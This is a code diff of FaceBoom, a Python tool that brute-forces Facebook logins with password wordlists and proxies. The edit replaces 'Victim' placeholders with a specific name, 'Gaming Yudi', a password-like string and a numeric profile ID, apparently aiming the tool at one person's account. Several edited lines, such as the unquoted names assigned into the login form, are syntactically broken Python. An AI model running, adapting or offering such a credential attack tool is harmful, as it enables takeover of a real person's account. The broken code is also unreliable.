@@ -76,7 +76,7 @@ class FaceBoom(object):
             idis = idre.search(con).group()
             print(wi+"\n["+gr+"+"+wi+"]"+gr+" Target Profile"+wi+" ID: "+yl+idis+wi)
         except Exception:
-            errMsg("Please Check Your Victim's Profile URL")
+            errMsg("Please Check Your Gaming Yudi Profile URL")
             sys.exit(1)
 
 
@@ -85,8 +85,8 @@ class FaceBoom(object):
         try:
             self.br.open("https://facebook.com")
             self.br.select_form(nr=0)
-            self.br.form['email']=target
-            self.br.form['pass']= password
+            self.br.form['email']=Gaming Yudi
+            self.br.form['pass']= momok123
             self.br.method ="POST"
             if self.br.submit().get_data().__contains__(b'home_icon'):return  1
             elif "checkpoint" in self.br.geturl(): return 2
@@ -165,15 +165,15 @@ OPTIONS:
 Examples:
         |
      |--------
-     | python faceboom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     | python faceboom.py -t Gaming Yudi -w /usr/share/wordlists/rockyou.txt
      |--------
-     | python faceboom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | python faceboom.py -t 100010115461407 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python faceboom.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
+     | python faceboom.py -t Gaming Yudi -w D:\\wordlist.txt -p 144.217.101.245:3129
      |--------
-     | python faceboom.py -t Victim@gmail.com -s 1234567
+     | python faceboom.py -t Gaming Yudi -s 1234567
      |--------
-     | python faceboom.py -g https://www.facebook.com/Victim_Profile
+     | python faceboom.py -g https://www.facebook.com/Gaming Yudi_Profile
      |--------
 """)
 
